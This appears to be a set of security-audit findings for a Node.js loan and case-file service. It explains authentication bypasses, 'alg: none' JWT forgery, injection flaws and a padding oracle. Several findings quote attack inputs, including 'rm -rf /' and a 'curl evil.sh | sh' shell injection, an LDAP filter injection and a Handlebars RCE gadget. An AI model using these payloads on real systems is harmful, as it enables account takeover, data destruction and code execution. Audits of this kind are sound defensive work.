extra.message: The phone-recovery flow issues a fully authenticated JWT for ANY account with no real identity verification. `/auth/phone-recovery/start` (no auth required) creates a session keyed only by a random id with `verified: false`. `/auth/phone-recovery/complete` (also no auth required) takes that session id plus an attacker-supplied `email`, looks up the user by email, unconditionally sets `session.verified = true`, and immediately issues a valid JWT for that user via generateToken(user) -- the 'out of band' SSN/security-question check mentioned in the comments is never actually performed or checked by the server. Any unauthenticated caller can chain these two endpoints with a victim's email address to obtain a full login token for that account, a complete authentication bypass / account takeover.

extra.message: Same authentication-bypass pattern as phone-recovery: `/auth/branch-assist/start` and `/auth/branch-assist/complete` require no authentication. completeBranchAssistSession looks up a user purely by attacker-supplied `email`, never verifies any real identity check happened, and returns a valid JWT (generateToken(user)) for that account. Anyone who knows a victim's email can take over their account.

extra.message: jwt.verify() is called with `algorithms: ['HS256', 'none']`. Including 'none' allows an attacker to craft an unsigned JWT (header {"alg":"none"}, no signature) with an arbitrary payload such as {"userId":"...","role":"admin"} and have it accepted as valid, bypassing signature verification entirely. Combined with the admin-scope check two lines below (`claims.role === 'admin' ? {} : ...`), this lets an unauthenticated attacker read every loan application and decision volume in the system by forging a cookie with role=admin.

CWE-347: Improper Verification of a Cryptographic Signature

extra.message: applyBureauRiskCallback is mounted with no `authenticate` middleware (`router.post('/applications/:applicationId/bureau-risk-callback', applyBureauRiskCallback)`), and there is no signature/HMAC/API-key verification of any kind. It trusts the client-supplied `x-vendor-tier` header and request body `access`/`riskTier` fields to directly set `application.riskTier` and fast-track the application, bypassing underwriter review. Any anonymous caller can send `x-vendor-tier: trusted` with `{"access":true,"riskTier":"low"}` to manipulate the risk tier of any loan application.

extra.message: applyBureauRiskCallbackV2 is also mounted with no `authenticate` middleware and no request-signing/HMAC check. Although it validates `vendorTier` against an allowlist and requires `result.access === true`, these values are trivially guessable/spoofable by anyone since there is no cryptographic verification that the caller is the real bureau vendor. An anonymous caller can still fast-track any application's risk tier by sending `x-vendor-tier: trusted` and `{"access":true}`.

extra.message: renderDocumentPreviewAs reads `targetFormat` directly from the attacker-controlled `x-preview-format` request header and interpolates it, unsanitized, into a shell command string passed to child_process.exec: `pandoc "${document.filePath}" -o "${outputPath}" -t ${targetFormat}`. Because exec() invokes a shell, an attacker can send a header like `x-preview-format: pdf; rm -rf / #` (or a subshell/backtick payload) to execute arbitrary OS commands.

extra.message: buildExportArchiveBundle takes `preset` directly from the request body with no allowlist/validation and interpolates it into a shell command executed via child_process.exec: `tar -c${preset === 'zip' ? 'j' : 'z'}f ${outputName}.${preset} -C ${bundleDir} .`. A value like `preset: "tar; curl evil.sh | sh #"` is passed straight to the shell, giving an authenticated admin-level caller (or anyone able to reach this endpoint) arbitrary command execution. Contrast with the safe twin `buildExportArchiveBundleV2`, which validates `preset` against `ALLOWED_ARCHIVE_PRESETS` and uses `spawn(..., { shell: false })` with an argument array.

extra.message: unsealCaseFilePacket decrypts with AES-256-CBC (unauthenticated encryption) and distinguishes a PKCS#7 padding failure ('bad decrypt' -> INVALID_PADDING) from any other decryption failure (DECRYPTION_FAILED). This distinct error is propagated to the HTTP client in src/routes/documents.ts openSealedCaseFilePacket ('Packet token has an invalid seal format' vs 'Packet token could not be decrypted'), giving an attacker the padding-validity oracle needed to mount a classic Vaudenay padding-oracle attack: by submitting crafted ciphertexts and observing which error is returned, an attacker can decrypt (and, with CBC malleability, forge) sealed case-file packets without ever knowing SEAL_KEY.

extra.message: searchStaffDirectory builds an LDAP filter by directly concatenating unescaped user input into the filter string: `(cn=*${term}*)` where `term` comes straight from `req.query.q`. An attacker can inject LDAP metacharacters (`*`, `(`, `)`, `\`) to alter the filter logic (e.g. `q=*)(objectClass=*` style injection) and broaden or bypass the intended search scope. Contrast with the adjacent findStaffMemberByEmail handler, which correctly calls `directoryClient.escapeFilter(email)` before building its filter.

extra.message: previewCorrespondenceDraft takes `bodyTemplate` directly from the request body and passes it to `Handlebars.compile(bodyTemplate)` before rendering it. Handlebars is a full template engine; compiling an attacker/staff-supplied template string (rather than only its data) permits Handlebars helper/constructor-access based template injection payloads (e.g. `{{#with "constructor"}}{{#with split}}{{pop}}{{push "return process.mainModule.require('child_process').execSync('id')"}}{{#with (...)}}...{{/with}}{{/with}}{{/with}}`-style Handlebars SSTI gadgets), which can lead to remote code execution in the Node process. Contrast with previewQuickNoteFromLibrary, which only compiles a fixed, developer-authored template from CORRESPONDENCE_SNIPPETS and takes only the merge-field values from the caller.
